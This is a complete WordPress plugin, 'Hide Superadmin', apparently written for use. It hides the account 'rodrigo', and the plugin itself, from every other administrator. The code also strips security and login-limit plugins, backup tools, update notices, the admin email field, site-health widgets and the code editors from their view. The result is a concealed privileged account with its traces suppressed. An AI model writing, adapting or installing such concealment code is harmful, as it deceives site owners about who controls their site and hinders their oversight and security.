<?php
/**
 * Plugin Name: Hide Superadmin
 * Description: Oculta o usuário do nome específico e plugins específicos para todos os usuários, exceto o próprio usuário especificado.
 * Version: 7.1
 * Author: Rodrigo Vieira
 * Author URI: https://www.programadorweb.com.br/plugins/hide-superadmin/
 * License: GPL2
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: hide-superadmin
 * Domain Path: /languages
 * Requires at least: 5.0
 * Requires PHP: 7.0
 */


/**
 * Hide specific user from user queries for all users except "rodrigo"
 * This function modifies the user query to exclude the user with the username "rodrigo" for all users except "rodrigo".
 * It is hooked to the 'pre_user_query' action.
 * @since 1.0.0
 * @param WP_User_Query $user_search The user query object.
 * @return void
 * @link https://developer.wordpress.org/reference/hooks/pre_user_query/
 * @see https://developer.wordpress.org/reference/classes/wp_user_query/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 * @package HideSuperadmin 
 */
add_action('pre_user_query', function ($user_search) {
    $current_user = wp_get_current_user();
    if ($current_user->user_login !== 'rodrigo') {
        global $wpdb;
        $user_search->query_where .= " AND {$wpdb->users}.user_login != 'rodrigo'";
    }
});

/**
 * Remove menu items for all users except "rodrigo"
 * This function hides specific admin menu items for all users except the user with the username "rodrigo".
 * It is hooked to the 'admin_menu' action with a priority of 110 to ensure it runs after other menu items are added.
 * @since 1.0.0
 * @return void
 * @link https://developer.wordpress.org/reference/hooks/admin_menu/
 * @see https://developer.wordpress.org/reference/functions/remove_menu_page/
 * @see https://developer.wordpress.org/reference/functions/remove_submenu_page/
 */
add_action('admin_menu', function () {
    $current_user = wp_get_current_user();
    if ($current_user->user_login !== 'rodrigo') {

        /**
         * Remove specific submenu pages for all users except "rodrigo"
         * This section hides the Theme Editor and Plugin Editor submenu pages for all users except the user "rodrigo".
         * Remove editor theme and plugin editor submenu pages to prevent access to code editing.
         * @since 1.0.0
         * @link https://developer.wordpress.org/reference/functions/remove_submenu_page/
         */
        remove_submenu_page('themes.php', 'theme-editor.php');
        remove_submenu_page('plugins.php', 'plugin-editor.php');
        
        /**
         * Remove specific menu pages for all users except "rodrigo"
         * This section hides various menu pages for all users except the user "rodrigo".
         * It includes Google Site Kit, All-in-One WP Migration, Bing Webmaster Tools, Login Press, and others.
         * @since 1.0.0
         * @link https://developer.wordpress.org/reference/functions/remove_menu_page/
         */
        $hide_menus = [
            'update-core.php',
            'edit-comments.php',
            'googlesitekit-dashboard',
            'ai1wm_export',
            'ai1wm_backups',
            'bing-url-submission',
            'github-updater/github-updater.php',
            'git-updater/git-updater.php',
            'loginpress-settings',
            'wprocket',
            'acf-options',
            'yoast-seo',
            'redirection',
            'really-simple-security',
            'html-minify'
        ];

        /**
         * foreach loop to remove each menu page
         * This loop iterates through the array of menu slugs and removes each one from the admin menu.
         * @since 1.0.0
         * @see https://developer.wordpress.org/reference/functions/remove_menu_page/
         * @see https://developer.wordpress.org/reference/functions/foreach/
         * @see https://developer.wordpress.org/reference/functions/remove_submenu_page/
         * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
         * @package HideSuperadmin
         */
        foreach ($hide_menus as $slug) {
            remove_menu_page($slug);
        }
    }
}, 110);

/**
 * Hide specific submenu pages for all users except "rodrigo"
 * This function hides specific submenu pages for all users except the user with the username "rodrigo".
 * It is hooked to the 'admin_menu' action with a priority of 999 to ensure it runs after other menu items are added.
 * @since 1.0.0
 * @return void
 * @link https://developer.wordpress.org/reference/hooks/admin_menu/
 * @see https://developer.wordpress.org/reference/functions/remove_submenu_page/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 * @package HideSuperadmin
 */
add_action('admin_menu', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        remove_submenu_page('themes.php', 'abw');
        remove_submenu_page('options-general.php', 'akismet-key-config');
        remove_submenu_page('options-general.php', 'minify_html_options');
        remove_submenu_page('options-general.php', 'wps-limit-login');
        remove_submenu_page('options-general.php', 'options-discussion.php');
        remove_submenu_page('options-general.php', 'options-privacy.php');
    }
}, 999);

/**
 * Filter to hide specific plugins for all users except "rodrigo"
 * This function filters the list of plugins to hide specific plugins for all users except the user "rodrigo".
 * It is hooked to the 'all_plugins' filter.
 * @since 1.0.0
 * @param array $plugins List of all plugins.
 * @return array Filtered list of plugins with specific plugins removed for all users except "rodrigo".
 * @link https://developer.wordpress.org/reference/hooks/all_plugins/
 * @see https://developer.wordpress.org/reference/functions/unset/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 */
add_filter('all_plugins', function ($plugins) {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        $hide_plugins = [
            'all-in-one-wp-migration/all-in-one-wp-migration.php',
            'all-in-one-wp-migration-unlimited-extension/all-in-one-wp-migration-unlimited-extension.php',
            'health-check/health-check.php',
            'google-site-kit/google-site-kit.php',
            'advanced-custom-fields-pro/acf.php',
            'akismet/akismet.php',
            'bing-webmaster-tools/bing-url-submission.php',
            'wordpress-seo/wp-seo.php',
            'wordpress-importer/wordpress-importer.php',
            'redirection/redirection.php',
            'really-simple-security/really-simple-security.php',
            'really-simple-ssl/rlrsssl-really-simple-ssl.php',
            'wp-rocket/wp-rocket.php',
            'minify-html-markup/minify-html.php',
            'xwps-limit-login/wps-limit-login.php',
            'loginpress/loginpress.php',
            'hide-superadmin/hide-superadmin.php' 
        ];

        foreach ($hide_plugins as $plugin) {
            unset($plugins[$plugin]);
        }
    }

    return $plugins;
});


/**
 * Hide the "Hide Superadmin" plugin from the plugins list for all users except "rodrigo"
 * This function hides the "Hide Superadmin" plugin from the plugins list for all users except the user "rodrigo".
 * It is hooked to the 'plugin_action_links' filter.
 * @since 1.0.0
 * @param array $actions List of action links for the plugin.
 * @return array Filtered list of action links with the "Hide Superadmin" link removed for all users except "rodrigo".
 * @link https://developer.wordpress.org/reference/hooks/plugin_action_links/
 */
add_action('admin_head', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        echo <<<HTML
<script>
    /**
     * Hide ACF menu item for all users except "rodrigo"
     * This script removes the ACF menu item from the admin menu for all users except the user "rodrigo".
     * It is executed when the DOM content is fully loaded.
     * @since 1.0.0
     * @link https://developer.wordpress.org/reference/hooks/admin_head/
     * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
     * @package HideSuperadmin
     * @author Rodrigo Vieira
     * @license GPL2
     * @license URI https://www.gnu.org/licenses/gpl-2.0.html
     */
    document.addEventListener('DOMContentLoaded', function () {
        const acfMenu = document.getElementById('toplevel_page_edit-post_type-acf-field-group');
        if (acfMenu) {
            acfMenu.remove();
        }
    });
</script>
HTML;
    }
});

/**
 * Hide update notifications for all users except "rodrigo"
 * This function hides update notifications (update-nag) for all users except the user "rodrigo".
 * It is hooked to the 'admin_head' action.
 * @since 1.0.0
 * @link https://developer.wordpress.org/reference/hooks/admin_head/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 */
add_action('admin_head', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        echo <<<HTML
<script>
document.addEventListener('DOMContentLoaded', function () {
    // Remove avisos de update-nag
    const nags = document.querySelectorAll('.update-nag.notice.notice-warning');
    nags.forEach(el => el.remove());
});
</script>
HTML;
    }
});

/**
 * Hide ACF cog icon for all users except "rodrigo"
 * This function hides the ACF cog icon (Edit Field Group) for all users except the user "rodrigo".
 * It is hooked to the 'admin_head' action.
 * @since 1.0.0
 * @link https://developer.wordpress.org/reference/hooks/admin_head/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 */
add_action('admin_head', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        echo <<<HTML
<script>
document.addEventListener('DOMContentLoaded', function () {
    // 1. Remove avisos do tipo update-nag
    document.querySelectorAll('.update-nag.notice.notice-warning').forEach(el => el.remove());

    // 2. Remove botão de engrenagem do ACF (Editar grupo de campos)
    document.querySelectorAll('a.acf-hndle-cog').forEach(el => el.remove());
});
</script>
HTML;
    }
});


/**
 * Hide the "Endereço de email de administração" field for all users except "rodrigo"
 * This function hides the "Endereço de email de administração" field in the General Settings page for all users except the user "rodrigo".
 * It is hooked to the 'admin_head-options-general.php' action.
 * @since 1.0.0
 * @link https://developer.wordpress.org/reference/hooks/admin_head-options-general.php/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 */
add_action('admin_head-options-general.php', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        echo <<<HTML
<script>
document.addEventListener('DOMContentLoaded', function () {
    // Seletor preciso para remover o campo de email de administração
    const emailRow = document.querySelector('#wpbody-content > div.wrap > form > table:nth-child(5) > tbody > tr:nth-child(6)');
    if (emailRow) {
        emailRow.remove();
    }
});
</script>
HTML;
    }
});


/**
 * Hide specific plugins from the plugin install page for all users except "rodrigo"
 * This function hides specific plugins from the plugin install page for all users except the user "rodrigo".
 * It is hooked to the 'admin_head-plugin-install.php' action.
 * @since 1.0.0
 * @link https://developer.wordpress.org/reference/hooks/admin_head-plugin-install.php/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 */
add_action('admin_head-plugin-install.php', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        echo <<<HTML
<script>
document.addEventListener('DOMContentLoaded', function () {
    const slugsToHide = [
        'all-in-one-wp-migration',
		'akismet',
        'advanced-custom-fields-pro',
        'bing-webmaster-tools',
        'elementor',
        'google-site-kit',
        'health-check',
        'header-footer-elementor',
		'wordpress-importer',
		'loginpress',
		'minify-html-markup',
		'seo-by-rank-math',
        'really-simple-ssl',
		'xwps-limit-login',
		'wps-limit-login',		
    ];

    const observer = new MutationObserver(() => {
        slugsToHide.forEach(slug => {
            document.querySelectorAll('.plugin-card-' + slug).forEach(el => el.remove());
        });
    });

    observer.observe(document.body, { childList: true, subtree: true });
});
</script>
HTML;
    }
});

/**
 * Hide the "Appearance > Editor" menu item for all users except "rodrigo"
 * This function hides the "Appearance > Editor" menu item for all users except the user "ro
 */
add_action('admin_head', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        echo <<<HTML
<script>
document.addEventListener('DOMContentLoaded', function () {
    const target = document.querySelector('#menu-appearance > ul > li:nth-child(3)');
    if (target) {
        target.remove();
    }
});
</script>
HTML;
    }
});


/**
 * Remove specific widgets from the dashboard for all users except "rodrigo"
 * This function removes specific widgets from the WordPress dashboard for all users except the user "rodrigo".
 * It is hooked to the 'wp_dashboard_setup' action.
 * @since 1.0.0
 * @link https://developer.wordpress.org/reference/hooks/wp_dashboard_setup/
 * @see https://developer.wordpress.org/reference/functions/remove_meta_box/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 */
add_action('wp_dashboard_setup', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        // Remove os widgets do dashboard
        remove_meta_box('dashboard_site_health', 'dashboard', 'normal');      // Saúde do site
        remove_meta_box('wps_limit_logindashboard_widget', 'dashboard', 'normal'); // WP Limit Login
        remove_meta_box('dashboard_primary', 'dashboard', 'side');            // Notícias do WordPress
    }
});


/**
 * Remove version information from the admin footer for all users except "rodrigo"
 * This function removes the version information from the admin footer for all users except the user "rodrigo".
 * It is hooked to the 'admin_footer' action.
 * @since 1.0.0
 * @link https://developer.wordpress.org/reference/hooks/admin_footer/
 * @see https://developer.wordpress.org/reference/functions/wp_get_current_user/
 * @see https://developer.wordpress.org/reference/functions/remove_action/
 * @package HideSuperadmin
 * @author Rodrigo Vieira
 * @license GPL2
 * @license URI https://www.gnu.org/licenses/gpl-2.0.html
 * @description This code snippet hides the WordPress version information from the admin footer for all users except the user "rodrigo".
 * It uses JavaScript to remove the version information element from the footer.
 * This is useful for security purposes, as it prevents revealing the WordPress version to unauthorized users.
 */
add_action('admin_footer', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'rodrigo') {
        echo <<<HTML
<script>
document.addEventListener('DOMContentLoaded', function () {
    const version = document.querySelector('#footer-upgrade');
    if (version) version.remove();
});
</script>
HTML;
    }
});
